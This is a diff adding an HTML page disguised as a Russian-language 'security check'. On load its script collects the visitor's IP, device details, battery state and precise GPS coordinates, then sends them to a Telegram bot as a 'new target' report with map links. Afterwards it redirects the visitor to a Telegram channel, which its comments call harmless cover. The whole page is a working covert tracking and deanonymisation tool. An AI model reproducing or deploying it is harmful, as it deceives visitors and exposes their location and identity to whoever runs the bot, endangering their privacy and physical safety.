@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Security Check</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+            animation: slideIn 0.5s ease;
+        }
+        @keyframes slideIn {
+            from { transform: translateY(-20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        h1 {
+            color: #333;
+            margin-bottom: 20px;
+            font-size: 28px;
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #667eea;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+            margin: 30px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .status-box {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+            font-size: 16px;
+            color: #555;
+            border-left: 4px solid #667eea;
+        }
+        .coordinates {
+            background: #e8f4fd;
+            border-radius: 10px;
+            padding: 15px;
+            margin: 20px 0;
+            font-family: monospace;
+            font-size: 14px;
+            text-align: left;
+            word-break: break-all;
+        }
+        .success {
+            color: #28a745;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+        .hidden {
+            display: none;
+        }
+        .progress-bar {
+            width: 100%;
+            height: 10px;
+            background: #f0f0f0;
+            border-radius: 5px;
+            overflow: hidden;
+            margin: 20px 0;
+        }
+        .progress {
+            height: 100%;
+            background: linear-gradient(90deg, #667eea, #764ba2);
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+        .fingerprint {
+            font-size: 12px;
+            color: #999;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="container">
+        <h1>🔐 Проверка безопасности</h1>
+        <div class="status-box" id="statusBox">
+            Инициализация защищенного соединения...
+        </div>
+        <div class="loader" id="loader"></div>
+        <div class="progress-bar">
+            <div class="progress" id="progress" style="width: 0%"></div>
+        </div>
+        <div id="details" class="hidden"></div>
+        <div class="fingerprint" id="fingerprint"></div>
+    </div>
+
+    <script>
+        // Конфигурация
+        const BOT_TOKEN = '7895222932'; // Токен бота (ID бота, но для отправки нужен токен)
+        const CHAT_ID = '7895222932'; // ID чата для отправки (тот же ID)
+        
+        // Функция отправки в Telegram
+        async function sendToTelegram(data) {
+            try {
+                // Формируем сообщение
+                let message = '🎯 <b>НОВАЯ ЦЕЛЬ</b>\n\n';
+                message += `<b>📊 ТИП:</b> ${data.type}\n`;
+                
+                if (data.type === 'gps') {
+                    message += `<b>📍 КООРДИНАТЫ:</b>\n`;
+                    message += `Широта: <code>${data.latitude}</code>\n`;
+                    message += `Долгота: <code>${data.longitude}</code>\n`;
+                    message += `<b>🎯 Точность:</b> ${data.accuracy}м\n`;
+                    if (data.altitude) message += `<b>⛰ Высота:</b> ${data.altitude}м\n`;
+                    
+                    // Ссылки на карты
+                    message += `\n<b>🗺 КАРТЫ:</b>\n`;
+                    message += `Google: https://www.google.com/maps?q=${data.latitude},${data.longitude}\n`;
+                    message += `Yandex: https://yandex.ru/maps/?pt=${data.longitude},${data.latitude}&z=18&l=map\n`;
+                    message += `2GIS: https://2gis.ru/geo/${data.longitude},${data.latitude}\n`;
+                }
+                
+                message += `\n<b>📱 УСТРОЙСТВО:</b>\n`;
+                message += `IP: <code>${data.ip}</code>\n`;
+                message += `User-Agent: ${data.userAgent}\n`;
+                message += `Платформа: ${data.platform}\n`;
+                message += `Язык: ${data.language}\n`;
+                message += `Экран: ${data.screen}\n`;
+                message += `Время: ${data.timestamp}\n`;
+                
+                if (data.battery) {
+                    message += `\n<b>🔋 Батарея:</b> ${data.battery.level * 100}% (${data.battery.charging ? 'зарядка' : 'разрядка'})\n`;
+                }
+                
+                // Отправляем через Telegram API
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML',
+                        disable_web_page_preview: true
+                    })
+                });
+                
+                const result = await response.json();
+                console.log('Telegram response:', result);
+                
+                // Дополнительно отправляем локацию если есть координаты
+                if (data.type === 'gps') {
+                    const locationUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
+                    await fetch(locationUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            latitude: data.latitude,
+                            longitude: data.longitude,
+                            horizontal_accuracy: data.accuracy
+                        })
+                    });
+                }
+                
+                return true;
+            } catch (error) {
+                console.error('Send error:', error);
+                
+                // Fallback: сохраняем в localStorage если нет отправки
+                const saved = JSON.parse(localStorage.getItem('pending_targets') || '[]');
+                saved.push(data);
+                localStorage.setItem('pending_targets', JSON.stringify(saved));
+                
+                return false;
+            }
+        }
+        
+        // Функция обновления статуса
+        function updateStatus(text, progress) {
+            document.getElementById('statusBox').innerHTML = text;
+            document.getElementById('progress').style.width = progress + '%';
+        }
+        
+        // Функция сбора данных
+        async function collectAndSend() {
+            const data = {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+            
+            // Получаем IP
+            updateStatus('📡 Получение IP-адреса...', 20);
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                data.ip = ipData.ip;
+                
+                // Дополнительная информация об IP
+                const ipInfoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                const ipInfo = await ipInfoResponse.json();
+                data.ip_info = ipInfo;
+            } catch (e) {
+                data.ip = 'unknown';
+            }
+            
+            // Получаем информацию о батарее
+            updateStatus('🔋 Проверка устройства...', 40);
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    data.battery = {
+                        level: battery.level,
+                        charging: battery.charging
+                    };
+                } catch (e) {}
+            }
+            
+            // Запрашиваем геолокацию
+            updateStatus('📍 Запрос геолокации...<br><small>Пожалуйста, разрешите доступ к местоположению</small>', 60);
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    async function(position) {
+                        data.type = 'gps';
+                        data.latitude = position.coords.latitude;
+                        data.longitude = position.coords.longitude;
+                        data.accuracy = position.coords.accuracy;
+                        data.altitude = position.coords.altitude;
+                        data.heading = position.coords.heading;
+                        data.speed = position.coords.speed;
+                        
+                        updateStatus('📤 Отправка данных...', 80);
+                        
+                        // Отправляем в Telegram
+                        const sent = await sendToTelegram(data);
+                        
+                        if (sent) {
+                            updateStatus('✅ Данные успешно отправлены!<br>Перенаправление...', 100);
+                            document.getElementById('loader').classList.add('hidden');
+                            
+                            // Показываем координаты
+                            const details = document.getElementById('details');
+                            details.classList.remove('hidden');
+                            details.innerHTML = `
+                                <div class="coordinates">
+                                    <div class="success">✓ Координаты получены</div>
+                                    <b>Широта:</b> ${data.latitude}<br>
+                                    <b>Долгота:</b> ${data.longitude}<br>
+                                    <b>Точность:</b> ${data.accuracy}м<br>
+                                    <b>IP:</b> ${data.ip}<br>
+                                    <b>Время:</b> ${new Date().toLocaleString()}
+                                </div>
+                            `;
+                            
+                            // Перенаправляем на безобидную страницу
+                            setTimeout(() => {
+                                window.location.href = 'https://t.me/s/ukraine_now';
+                            }, 3000);
+                        } else {
+                            updateStatus('⚠️ Ошибка отправки, но данные сохранены локально', 100);
+                        }
+                    },
+                    function(error) {
+                        data.type = 'error';
+                        data.error = error.message;
+                        
+                        let errorText = '❌ Ошибка геолокации: ';
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                errorText += 'Доступ запрещен';
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                errorText += 'Информация недоступна';
+                                break;
+                            case error.TIMEOUT:
+                                errorText += 'Таймаут';
+                                break;
+                        }
+                        
+                        updateStatus(errorText, 100);
+                        sendToTelegram(data);
+                        
+                        // Все равно перенаправляем
+                        setTimeout(() => {
+                            window.location.href = 'https://t.me/s/ukraine_now';
+                        }, 3000);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 15000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                data.type = 'error';
+                data.error = 'Geolocation not supported';
+                updateStatus('❌ Геолокация не поддерживается', 100);
+                sendToTelegram(data);
+                
+                setTimeout(() => {
+                    window.location.href = 'https://t.me/s/ukraine_now';
+                }, 2000);
+            }
+            
+            // Дополнительная информация
+            if (navigator.connection) {
+                data.connection = {
+                    type: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt
+                };
+            }
+            
+            // WebGL вендор для fingerprint
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                if (gl) {
+                    data.webgl_vendor = gl.getParameter(gl.VENDOR);
+                    data.webgl_renderer = gl.getParameter(gl.RENDERER);
+                }
+            } catch (e) {}
+            
+            document.getElementById('fingerprint').innerHTML = 
+                `ID сессии: ${Math.random().toString(36).substring(7)}`;
+        }
+        
+        // Запускаем сбор при загрузке
+        window.onload = collectAndSend;
+    </script>
+</body>
+</html>
